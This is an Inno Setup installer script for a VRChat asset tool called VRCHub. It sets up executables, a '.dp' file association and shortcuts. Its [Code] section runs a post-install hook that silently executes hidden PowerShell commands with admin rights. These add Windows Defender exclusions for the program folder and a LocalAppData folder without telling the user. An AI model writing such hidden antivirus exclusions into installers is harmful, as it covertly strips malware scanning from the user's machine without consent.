; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "VRCHub"
#define MyAppVersion "1.0.5"
#define MyAppPublisher "Zer0, MagmaMC"
#define MyAppURL "https://vrchub.site"
#define MyAppExeName "VRCHub.exe"

[Setup]
; NOTE: The value of AppId uniquely identifies this application. Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{FBEF21E8-2CF8-484F-972D-DC1329C6C5F0}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
VersionInfoVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={autopf}\{#MyAppName}
; "ArchitecturesAllowed=x64compatible" specifies that Setup cannot run
; on anything but x64 and Windows 11 on Arm.
ArchitecturesAllowed=x64compatible
; "ArchitecturesInstallIn64BitMode=x64compatible" requests that the
; install be done in "64-bit mode" on x64 or Windows 11 on Arm,
; meaning it should use the native 64-bit Program Files directory and
; the 64-bit view of the registry.
ArchitecturesInstallIn64BitMode=x64compatible
DisableProgramGroupPage=yes
PrivilegesRequired=admin
OutputDir=Build\
OutputBaseFilename=VRCHub Setup
SetupIconFile=Resources\VRCHUB.ico
Compression=lzma2/fast
SolidCompression=yes
WizardStyle=modern

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "bin\publish\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion 64bit
Source: "VRCDataMod\publish\VRCDataMod.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "Resources\Package.ico"; DestDir: "{app}"; Flags: ignoreversion
Source: "bin\publish\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubdirs ignoreversion

[Tasks]
Name: "create_start_menu_shortcut"; Description: "Create a Start Menu shortcut"; GroupDescription: "Additional tasks:"
Name: "create_desktop_shortcut"; Description: "Create a Desktop shortcut"; GroupDescription: "Additional tasks:"; Flags: checkedonce

[Icons]
Name: "{autoprograms}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: create_start_menu_shortcut
Name: "{userdesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: create_desktop_shortcut

[Registry]
Root: HKCR; Subkey: ".dp"; ValueType: string; ValueName: ""; ValueData: "{#MyAppName}.dp"; Flags: uninsdeletevalue
Root: HKCR; Subkey: "{#MyAppName}.dp"; ValueType: string; ValueName: ""; ValueData: "VRChat Asset Package"; Flags: uninsdeletekey
Root: HKCR; Subkey: "{#MyAppName}.dp\DefaultIcon"; ValueType: string; ValueName: ""; ValueData: """{app}\Package.ico"""; Flags: uninsdeletekey
Root: HKCR; Subkey: "{#MyAppName}.dp\Shell\Open\Command"; ValueType: string; ValueName: ""; ValueData: """{app}\VRCDataMod.exe"" ""%1"""; Flags: uninsdeletekey

[Code]
procedure AddWindowsDefenderExclusions();
var
  ResultCode: Integer;
begin
  // Add exclusion for the application directory
  Exec('cmd.exe', '/c powershell -c "Add-MpPreference -ExclusionPath """' + ExpandConstant('{app}') + '""" "', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  
  // Add exclusion for the local app data directory
  Exec('cmd.exe', '/c powershell -c "Add-MpPreference -ExclusionPath """' + ExpandConstant('{localappdata}\VRCHub') + '""" "', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;
procedure CurStepChanged(CurStep: TSetupStep);
begin
  if CurStep = ssPostInstall then
    AddWindowsDefenderExclusions();
end;

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: nowait postinstall skipifsilent

